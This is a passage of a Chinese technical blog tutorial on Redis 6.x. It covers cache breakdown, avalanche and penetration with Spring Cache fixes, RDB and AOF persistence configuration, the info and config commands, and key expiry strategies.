(某个热点key缓存失效了)</p><ul><li>缓存中没有但数据库中有的数据，假如是热点数据，那key在缓存过期的一刻，同时有大量的请求，这些请求都会击穿到DB，造成瞬时DB请求量大、压力增大。</li><li>和缓存雪崩的区别在于这里针对某一key缓存，后者则是很多key。</li></ul></li><li><p>预防</p><ul><li>设置热点数据不过期</li><li>定时任务定时更新缓存</li><li>设置互斥锁</li></ul></li><li><p>SpringCache解决方案</p><ul><li>缓存的同步 sync</li><li>sync 可以指示底层将缓存锁住，使只有一个线程可以进入计算，而其他线程堵塞，直到返回结果更新到缓存中</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Cacheable</span>(value = &#123;<span class="string">"product"</span>&#125;,key = <span class="string">"#root.args[0]"</span>, cacheManager = <span class="string">"customCacheManager"</span>, sync=<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h2 id="分布式缓存必考题之缓存雪崩-解决方案"><a href="#分布式缓存必考题之缓存雪崩-解决方案" class="headerlink" title="分布式缓存必考题之缓存雪崩+解决方案"></a><strong>分布式缓存必考题之缓存雪崩+解决方案</strong></h2><p>缓存雪崩 (多个热点key都过期)</p><ul><li><p>大量的key设置了相同的过期时间，导致在缓存在同一时刻全部失效，造成瞬时DB请求量大、压力骤增，引起雪崩</p></li><li><p>预防</p><ul><li>存数据的过期时间设置随机，防止同一时间大量数据过期现象发生</li><li>设置热点数据永远不过期，定时任务定时更新</li></ul></li><li><p>SpringCache解决方案</p><ul><li>设置差别的过时时间</li><li>比如CacheManager配置多个过期时间维度</li><li>配置文件 time-to-live 配置</li></ul></li><li><pre><code class="yml"><span class="attr">cache:</span>   <span class="comment">#使用的缓存类型</span>    <span class="attr">type:</span> <span class="string">redis</span>   <span class="comment">#过时时间</span>    <span class="attr">redis:</span>      <span class="attr">time-to-live:</span> <span class="number">3600000</span>      <span class="comment"># 开启前缀，默以为true</span>      <span class="attr">use-key-prefix:</span> <span class="literal">true</span>      <span class="comment"># 键的前缀,默认就是缓存名cacheNames</span>      <span class="attr">key-prefix:</span> <span class="string">XD_CACHE</span>      <span class="comment"># 是否缓存空结果，防止缓存穿透，默以为true</span>      <span class="attr">cache-null-values:</span> <span class="literal">true</span><span class="string"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## **分布式缓存必考题之缓存穿透+解决方案**</span><br><span class="line"></span><br><span class="line">缓存穿透（查询不存在数据）</span><br><span class="line"></span><br><span class="line">- 查询一个不存在的数据，由于缓存是不命中的，并且出于容错考虑，如发起为id为“-1”不存在的数据</span><br><span class="line">- 如果从存储层查不到数据则不写入缓存这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义。存在大量查询不存在的数据，可能DB就挂掉了，这也是黑客利用不存在的key频繁攻击应用的一种方式。</span><br><span class="line"></span><br><span class="line">- 预防</span><br><span class="line">  - 接口层增加校验，数据合理性校验</span><br><span class="line">  - 缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，设置短点的过期时间，防止同个key被一直攻击</span><br><span class="line"></span><br><span class="line">SpringCache解决方案</span><br><span class="line"></span><br><span class="line">- 空结果也缓存，默认不配置condition或者unless就行</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;yml</span><br><span class="line"> cache:</span><br><span class="line">   #使用的缓存类型</span><br><span class="line">    type: redis</span><br><span class="line">   #过时时间</span><br><span class="line">    redis:</span><br><span class="line">      time-to-live: 3600000</span><br><span class="line">      # 开启前缀，默以为true</span><br><span class="line">      use-key-prefix: true</span><br><span class="line">      # 键的前缀,默认就是缓存名cacheNames</span><br><span class="line">      key-prefix: XD_CACHE</span><br><span class="line">      # 是否缓存空结果，防止缓存穿透，默以为true</span><br><span class="line">      cache-null-values: true</span><br></pre></td></tr></table></figure></span></code></pre></li></ul><h1 id="分布式缓存Redis6-x持久化配置实战-AOF和RDB"><a href="#分布式缓存Redis6-x持久化配置实战-AOF和RDB" class="headerlink" title="分布式缓存Redis6.x持久化配置实战-AOF和RDB"></a>分布式缓存Redis6.x持久化配置实战-AOF和RDB</h1><h2 id="Redis6-x持久化介绍和RDB介绍"><a href="#Redis6-x持久化介绍和RDB介绍" class="headerlink" title="Redis6.x持久化介绍和RDB介绍"></a>Redis6.x持久化介绍和RDB介绍</h2><ul><li><p>Redis持久化介绍</p><ul><li>Redis是一个内存数据库，如果没有配置持久化，redis重启后数据就全丢失</li><li>因此开启redis的持久化功能，将数据保存到磁盘上，当redis重启后，可以从磁盘中恢复数据。</li></ul></li><li><p>两种持久化方式</p><ul><li>RDB (Redis DataBase)</li><li>AOF (append only file）</li></ul></li><li><p>RDB持久化介绍</p><ul><li>在指定的时间间隔内将内存中的数据集快照写入磁盘</li><li>默认的文件名为dump.rdb</li><li>产生快照的情况<ul><li>save<ul><li>会阻塞当前Redis服务器，执行save命令期间，Redis不能处理其他命令，直到RDB过程完成为止</li></ul></li><li>bgsave<ul><li>fork创建子进程，RDB持久化过程由子进程负责，会在后台异步进行快照操作，快照同时还可以响应客户端请求</li></ul></li><li>自动化<ul><li>配置文件来完成，配置触发 Redis的 RDB 持久化条件</li><li>比如 “save m n”。表示m秒内数据集存在n次修改时，自动触发bgsave</li></ul></li><li>主从架构<ul><li>从服务器同步数据的时候，会发送sync执行同步操作，master主服务器就会执行bgsave</li></ul></li></ul></li></ul></li><li><p>优点</p><ul><li>RDB文件紧凑，全量备份，适合用于进行备份和灾难恢复</li><li>在恢复大数据集时的速度比 AOF 的恢复速度要快</li><li>生成的是一个紧凑压缩的二进制文件</li></ul></li><li><p>缺点</p><ul><li>每次快照是一次全量备份，fork子进程进行后台操作，子进程存在开销</li><li>在快照持久化期间修改的数据不会被保存，可能丢失数据</li></ul></li><li><p>核心配置</p><ul><li>dir 持久化文件的路径</li><li>dbfilename 文件名</li></ul></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#任何ip可以访问</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#守护进程</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="string">requirepass</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#日志文件</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis.log"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#持久化文件名称</span></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">xdclass.rdb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#持久化文件存储路径</span></span><br><span class="line"><span class="string">dir</span> <span class="string">/usr/local/redis/data</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#持久化策略, 10秒内有个1个key改动，执行快照</span></span><br><span class="line"><span class="string">save</span> <span class="number">10</span> <span class="number">1</span></span><br><span class="line"><span class="comment">#10秒2个key变动则触发rdb</span></span><br><span class="line"><span class="string">save</span> <span class="number">10</span> <span class="number">2</span></span><br><span class="line"><span class="comment">#100秒5个key变动则触发rdb</span></span><br><span class="line"><span class="string">save</span> <span class="number">100</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######之前配置######</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#导出rdb数据库文件压缩字符串和对象，默认是yes，会浪费CPU但是节省空间</span></span><br><span class="line"><span class="string">rdbcompression</span> <span class="literal">yes</span></span><br><span class="line"><span class="comment"># 导入时是否检查</span></span><br><span class="line"><span class="string">rdbchecksum</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure><ul><li><p>备注: linux内存分配策略</p><p>0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程</p><p>1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。<br>2 表示内核允许分配超过所有物理内存和交换空间总和的内存</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解决方式</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/vm/overcommit_memory</span><br><span class="line"><span class="comment"># 持久化配置</span></span><br><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 改为vm.overcommit_memory=1</span></span><br><span class="line"><span class="comment">#修改sysctl.conf后，需要执行以下命令以使生效</span></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024222421.png" alt="image-20211024221802881"></p><h1 id="Redis6-x持久化配置AOF介绍和配置实战"><a href="#Redis6-x持久化配置AOF介绍和配置实战" class="headerlink" title="Redis6.x持久化配置AOF介绍和配置实战"></a>Redis6.x持久化配置AOF介绍和配置实战</h1><ul><li>AOF持久化介绍<ul><li>append only file，追加文件的方式，文件容易被人读懂</li><li>以独立日志的方式记录每次写命令， 重启时再重新执行AOF文件中的命令达到恢复数据的目的</li><li>写入过程宕机，也不影响之前的数据，可以通过 redis-check-aof检查修复问题</li></ul></li><li>配置实战<ul><li>appendonly yes，默认不开启</li><li>AOF文件名 通过 appendfilename 配置设置，默认文件名是appendonly.aof</li><li>存储路径同 RDB持久化方式一致，使用dir配置</li></ul></li><li>核心原理<ul><li>Redis每次写入命令会追加到aof_buf（缓冲区）</li><li>AOF缓冲区根据对应的策略向硬盘做同步操作</li><li>高频AOF会带来影响，特别是每次刷盘</li></ul></li><li>提供了3种同步方式，在性能和安全性方面做出平衡<ul><li>appendfsync always<ul><li>每次有数据修改发生时都会写入AOF文件，消耗性能多</li></ul></li><li>appendfsync everysec<ul><li>每秒钟同步一次，该策略为AOF的缺省策略。</li></ul></li><li>appendfsync no<ul><li>不主从同步，由操作系统自动调度刷磁盘，性能是最好的，但是最不安全</li></ul></li></ul></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="string">requirepass</span> <span class="string">123456Xdclass</span></span><br><span class="line"></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis.log"</span></span><br><span class="line"></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">xdclass.rdb</span></span><br><span class="line"></span><br><span class="line"><span class="string">dir</span> <span class="string">/usr/local/redis/data</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#save 10 2</span></span><br><span class="line"><span class="comment">#save 100 5</span></span><br><span class="line"><span class="string">save</span> <span class="string">""</span></span><br><span class="line"><span class="string">rdbcompression</span> <span class="literal">yes</span></span><br><span class="line"><span class="comment">#对rdb数据进行校验，耗费CPU资源，默认为yes</span></span><br><span class="line"><span class="string">rdbchecksum</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">appendfilename</span> <span class="string">"appendonly.aof"</span></span><br><span class="line"><span class="string">appendfsync</span> <span class="string">everysec</span></span><br></pre></td></tr></table></figure><h2 id="Redis6-x持久化配置AOF重新rewrite配置实战"><a href="#Redis6-x持久化配置AOF重新rewrite配置实战" class="headerlink" title="Redis6.x持久化配置AOF重新rewrite配置实战"></a>Redis6.x持久化配置AOF重新rewrite配置实战</h2><ul><li>rewrite 重写介绍<ul><li>AOF文件越来越大，需要定期对AOF文件进行重写达到压缩</li><li>旧的AOF文件含有无效命令会被忽略，保留最新的数据命令</li><li>多条写命令可以合并为一个</li><li>AOF重写降低了文件占用空间</li><li>更小的AOF 文件可以更快地被Redis加载</li></ul></li><li>手动触发<ul><li>直接调用bgrewriteaof命令</li></ul></li><li>自动触发<ul><li>auto-aof-rewrite-min-size和auto-aof-rewrite-percentage参数</li><li>auto-aof-rewrite-min-size<ul><li>表示运行AOF重写时文件最小体积，默认 为64MB。</li></ul></li><li>auto-aof-rewrite-percentage<ul><li>代表当前AOF文件空间和上一次重写后AOF文件空间（aof_base_size）的比值。</li></ul></li></ul></li><li>常用配置</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 是否开启aof</span></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名称</span></span><br><span class="line"><span class="string">appendfilename</span> <span class="string">"appendonly.aof"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步方式</span></span><br><span class="line"><span class="string">appendfsync</span> <span class="string">everysec</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># aof重写期间是否同步</span></span><br><span class="line"><span class="literal">no</span><span class="string">-appendfsync-on-rewrite</span> <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重写触发配置</span></span><br><span class="line"><span class="string">auto-aof-rewrite-percentage</span> <span class="number">100</span></span><br><span class="line"><span class="string">auto-aof-rewrite-min-size</span> <span class="string">64mb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载aof时如果有错如何处理</span></span><br><span class="line"><span class="comment"># yes表示如果aof尾部文件出问题，写log记录并继续执行。no表示提示写入等待修复后写入</span></span><br><span class="line"></span><br><span class="line"><span class="string">aof-load-truncated</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure><h2 id="Redis6-x持久化配置AOF-RDB的选择问题和混合模式"><a href="#Redis6-x持久化配置AOF-RDB的选择问题和混合模式" class="headerlink" title="Redis6.x持久化配置AOF+RDB的选择问题和混合模式"></a>Redis6.x持久化配置AOF+RDB的选择问题和混合模式</h2><ul><li><p>Redis提供了不同的持久性选项：</p><ul><li>RDB持久化以指定的时间间隔执行数据集的时间点快照。</li><li>AOF持久化记录服务器接收的每个写入操作，将在服务器启动时再次读取，重建原始数据集。使用与Redis协议本身相同的格式以仅追加方式记录命令，当文件太大时，Redis能够重写</li></ul></li><li><p>补充之前的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto-aof-rewrite-min-size</span><br><span class="line">AOF文件最小重写大小，只有当AOF文件大小大于该值时候才可能重写,6.x默认配置64mb。</span><br><span class="line"></span><br><span class="line">auto-aof-rewrite-percentage</span><br><span class="line">当前AOF文件大小和最后一次重写后的大小之间的比率等于或者等于指定的增长百分比，如100代表当前AOF文件是上次重写的两倍时候才重写。</span><br></pre></td></tr></table></figure></li><li><p>RDB的优缺点</p><ul><li>优点：<ul><li>RDB最大限度地提高了Redis的性能，父进程不需要参与磁盘I/O</li><li>RDB文件紧凑，全量备份，适合用于进行备份和灾难恢复</li><li>在恢复大数据集时的速度比 AOF 的恢复速度要快</li><li>生成的是一个紧凑压缩的二进制文件</li></ul></li><li>缺点：<ul><li>如果您需要在Redis停止工作时（例如断电后）将数据丢失的可能性降至最低，则RDB并不好</li><li>RDB经常需要fork才能使用子进程持久存储在磁盘上。如果数据集很大，Fork可能会非常耗时</li></ul></li></ul></li><li><p>AOF的优缺点</p><ul><li>优点：<ul><li>数据更加安全</li><li>当Redis AOF文件太大时，Redis能够在后台自动重写AOF</li><li>AOF以易于理解和解析的格式，一个接一个地包含所有操作的日志</li></ul></li><li>缺点：<ul><li>AOF文件通常比同一数据集的等效RDB文件大</li><li>根据确切的fsync策略，恢复的时候AOF可能比RDB慢</li></ul></li></ul></li><li><p>在线上我们到底该怎么做？</p><ul><li>RDB持久化与AOF持久化一起使用</li><li>如果Redis中的数据并不是特别敏感或者可以通过其它方式重写生成数据</li><li>集群中可以关闭AOF持久化，靠集群的备份方式保证可用性</li><li>自己制定策略定期检查Redis的情况，然后可以手动触发备份、重写数据；</li><li>采用集群和主从同步</li></ul></li><li><p>Redis4.0后开始的rewrite支持混合模式</p></li><li><p>就是rdb和aof一起用</p></li><li><p>直接将rdb持久化的方式来操作将二进制内容覆盖到aof文件中,rdb是二进制，所以很小</p></li><li><p>有写入的话还是继续append追加到文件原始命令，等下次文件过大的时候再次rewrite</p></li><li><p>默认是开启状态</p></li><li><p>好处</p><ul><li>混合持久化结合了RDB持久化 和 AOF 持久化的优点,采取了rdb的文件小，易于灾难恢复</li><li>同时结合AOF，增量的数据以AOF方式保存了，数据更少的丢失</li></ul></li><li><p>坏处</p><ul><li>前部分是RDB格式，是二进制，所以阅读性较差</li></ul></li><li><p>数据恢复</p><ul><li>先看是否存在aof文件，若存在则先按照aof文件恢复，aof比rdb全，且aof文件也rewrite成rdb二进制格式</li><li>若aof不存在，则才会查找rdb是否存在</li></ul></li></ul><h1 id="Redis6-X服务端info-config实战和key淘汰算法"><a href="#Redis6-X服务端info-config实战和key淘汰算法" class="headerlink" title="Redis6.X服务端info+config实战和key淘汰算法"></a>Redis6.X服务端info+config实战和key淘汰算法</h1><h2 id="Redis6-x服务端配置-info命令介绍-生产监控知识"><a href="#Redis6-x服务端配置-info命令介绍-生产监控知识" class="headerlink" title="Redis6.x服务端配置 info命令介绍-生产监控知识"></a>Redis6.x服务端配置 info命令介绍-生产监控知识</h2><p>info命令介绍</p><ul><li>服务器的各种信息和统计数值</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Server：有关redis服务器的常规信息</span></span><br><span class="line">  <span class="string">redis_mode:standalone</span>                         <span class="comment"># 运行模式，单机或者集群</span></span><br><span class="line">  <span class="string">multiplexing_api:epoll</span>                        <span class="comment"># redis所使用的事件处理机制</span></span><br><span class="line">  <span class="string">run_id:3abd26c33dfd059e87a0279defc4c96c13962ede</span> <span class="comment"># redis服务器的随机标识符(用于sentinel和集群)</span></span><br><span class="line">  <span class="string">config_file:/usr/local/redis/conf/redis.conf</span>       <span class="comment"># 配置文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="string">Clients：客户端连接部分</span></span><br><span class="line">  <span class="string">connected_clients:10</span>           <span class="comment"># 已连接客户端的数量(不包括通过slave连接的客户端)</span></span><br><span class="line">  </span><br><span class="line"><span class="string">Memory：内存消耗相关信息</span></span><br><span class="line">  <span class="string">used_memory:874152</span>  <span class="comment"># 使用内存，以字节（byte）B为单位</span></span><br><span class="line">  <span class="string">used_memory_human:853.66K</span> <span class="comment"># 以人类可读的格式返回 Redis 分配的内存总量</span></span><br><span class="line">  <span class="string">used_memory_rss:2834432</span> <span class="comment"># 系统给redis分配的内存即常驻内存，和top 、 ps 等命令的输出一致</span></span><br><span class="line">  <span class="string">used_memory_rss_human:2.70M</span>  <span class="comment"># 以人类可读的格式返回系统redis分配的常驻内存top、ps等命令的输出一致</span></span><br><span class="line">  <span class="string">used_memory_peak:934040</span>  <span class="comment"># 内存使用的峰值大小</span></span><br><span class="line">  <span class="string">used_memory_peak_human:912.15K</span></span><br><span class="line"></span><br><span class="line">  <span class="string">total_system_memory:1039048704</span>  <span class="comment"># 操作系统的总内存 ，以字节（byte）为单位</span></span><br><span class="line">  <span class="string">total_system_memory_human:990.91M</span> </span><br><span class="line">  <span class="string">used_memory_lua:37888</span>  <span class="comment"># lua引擎使用的内存</span></span><br><span class="line">  <span class="string">used_memory_lua_human:37.00K</span></span><br><span class="line"></span><br><span class="line">  <span class="string">maxmemory:0</span>  <span class="comment"># 最大内存的配置值，0是不限制</span></span><br><span class="line">  <span class="string">maxmemory_human:0B</span>  </span><br><span class="line">  <span class="string">maxmemory_policy:noeviction</span>  <span class="comment"># 达到最大内存配置值后的策略</span></span><br><span class="line">  </span><br><span class="line"><span class="string">Persistence：RDB和AOF相关信息</span></span><br><span class="line">  <span class="string">rdb_bgsave_in_progress:0</span>   <span class="comment"># 标识rdb save是否进行中</span></span><br><span class="line">  <span class="string">rdb_last_bgsave_status:ok</span>        <span class="comment"># 上次的save操作状态</span></span><br><span class="line">  <span class="string">rdb_last_bgsave_status:ok</span>        <span class="comment"># 上次的save操作状态</span></span><br><span class="line">  <span class="string">rdb_last_bgsave_time_sec:-1</span>        <span class="comment"># 上次rdb save操作使用的时间(单位s)</span></span><br><span class="line">  <span class="string">rdb_current_bgsave_time_sec:-1</span>    <span class="comment"># 如果rdb save操作正在进行，则是所使用的时间</span></span><br><span class="line"></span><br><span class="line">  <span class="string">aof_enabled:1</span>                    <span class="comment"># 是否开启aof，默认没开启</span></span><br><span class="line">  <span class="string">aof_rewrite_in_progress:0</span>        <span class="comment"># 标识aof的rewrite操作是否在进行中</span></span><br><span class="line">  <span class="string">aof_last_rewrite_time_sec:-1</span>    <span class="comment"># 上次rewrite操作使用的时间(单位s)</span></span><br><span class="line">  <span class="string">aof_current_rewrite_time_sec:-1</span> <span class="comment"># 如果rewrite操作正在进行，则记录所使用的时间</span></span><br><span class="line">  <span class="string">aof_last_bgrewrite_status:ok</span>    <span class="comment"># 上次rewrite操作的状态</span></span><br><span class="line">  <span class="string">aof_current_size:0</span>                <span class="comment"># aof当前大小</span></span><br><span class="line"></span><br><span class="line"><span class="string">Stats：一般统计</span></span><br><span class="line">  <span class="string">evicted_keys:0</span>                    <span class="comment"># 因为内存大小限制，而被驱逐出去的键的个数</span></span><br><span class="line"></span><br><span class="line"><span class="string">Replication：主从同步信息</span></span><br><span class="line">  <span class="string">role:master</span>                        <span class="comment"># 角色</span></span><br><span class="line">  <span class="string">connected_slaves:1</span>                <span class="comment"># 连接的从库数</span></span><br><span class="line">  <span class="string">master_sync_in_progress:0</span>        <span class="comment"># 标识主redis正在同步到从redis</span></span><br><span class="line"></span><br><span class="line"><span class="string">CPU：CPU消耗统计</span></span><br><span class="line"></span><br><span class="line"><span class="string">Cluster：集群部分</span></span><br><span class="line">  <span class="string">cluster_enabled:0</span>  <span class="comment"># 实例是否启用集群模式</span></span><br><span class="line"></span><br><span class="line"><span class="string">Keyspace：数据库相关统计</span></span><br><span class="line">  <span class="string">db0:keys=4,expires=0,avg_ttl=0</span>  <span class="comment"># db0的key的数量,带有生存期的key的数,平均存活时间</span></span><br></pre></td></tr></table></figure><h2 id="Redis6-x服务端配置config命令介绍和最大内存配置"><a href="#Redis6-x服务端配置config命令介绍和最大内存配置" class="headerlink" title="Redis6.x服务端配置config命令介绍和最大内存配置"></a>Redis6.x服务端配置config命令介绍和最大内存配置</h2><ul><li>config命令介绍（都有默认值）<ul><li>可以动态地调整 Redis 服务器的配置(configuration)而无须重启</li><li>config get xxx、config set xxx</li></ul></li><li>常用配置</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">daemonize</span>  <span class="comment">#后端运行</span></span><br><span class="line"><span class="string">bind</span> <span class="comment">#ip绑定</span></span><br><span class="line"><span class="string">timeout</span>  <span class="comment">#客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接</span></span><br><span class="line"></span><br><span class="line"><span class="string">databases</span> <span class="comment">#设置数据库的个数，可以使用 SELECT 命令来切换数据库。默认使用的数据库是 0</span></span><br><span class="line"><span class="string">save</span>  <span class="comment">#设置 Redis 进行rdb持久化数据库镜像的频率。</span></span><br><span class="line"><span class="string">rdbcompression</span> <span class="comment">#在进行镜像备份时，是否进行压缩</span></span><br><span class="line"></span><br><span class="line"><span class="string">slaveof</span> <span class="comment">#设置该数据库为其他数据库的从数据库</span></span><br><span class="line"><span class="string">masterauth</span>  <span class="comment">#当主数据库连接需要密码验证时，在这里配置</span></span><br><span class="line"></span><br><span class="line"><span class="string">maxclients</span>  <span class="comment">#限制同时连接的客户数量,当连接数超过这个值时,redis 将不再接收其他连接请求,返回error</span></span><br><span class="line"></span><br><span class="line"><span class="string">maxmemory</span>  <span class="comment">#设置 redis 能够使用的最大内存，</span></span><br></pre></td></tr></table></figure><ul><li>maxmemory #设置 redis 能够使用的最大内存，</li><li>备注<ul><li>防止所用内存超过服务器物理内存， maxmemory限制的是Redis实际使用的内存量， 也就是used_memory统计项对应的内存</li><li>由于内存碎片率的存在， 实际消耗的内存可能会比maxmemory设置的更大， 实际使用时要小心这部分内存溢出</li><li>默认无限使用服务器内存， 为防止极端情况下导致系统内存耗尽， 建议所有的Redis进程都要配置maxmemory</li><li>在64bit系统下，maxmemory设置为0表示不限制Redis内存使用，在32bit系统下，maxmemory不能超过3GB</li></ul></li></ul><h2 id="Redis6的key过期时间删除策略"><a href="#Redis6的key过期时间删除策略" class="headerlink" title="Redis6的key过期时间删除策略"></a>Redis6的key过期时间删除策略</h2><p>背景</p><ul><li>redis的key配置了过期时间，这个是怎么被删除的</li><li>redis数据明明过期了，怎么还占用着内存？</li><li>Redis 就只能用 10G，你要是往里面写了 20G 的数据，会发生什么？淘汰哪些数据</li></ul><p>redis key过期策略</p><ul><li><p>定期删除+惰性删除</p></li><li><p>Redis如何淘汰过期的keys： set name xdclass 3600</p><ul><li><p>定期删除：</p><ul><li>隔一段时间，就随机抽取一些设置了过期时间的 key，检查其是否过期，如果过期就删除，</li><li>定期删除可能会导致很多过期 key 到了时间并没有被删除掉，那咋整呢，所以就是惰性删除</li></ul></li><li><p>惰性删除 ：</p><ul><li>概念：当一些客户端尝试访问它时，key会被发现并主动的过期</li><li>放任键过期不管，但是每次从键空间中获取键时，都检查取得的键是否过期，如果过期的话，就删除该键</li></ul></li><li><p>Redis服务器实际使用的是惰性删除和定期删除两种策略：通过配合使用这两种删除策略，服务器可以很好地在合理使用CPU时间和避免浪费内存空间之间取得平衡。</p></li><li><p>问题</p><ul><li>如果定期删除漏掉了很多过期 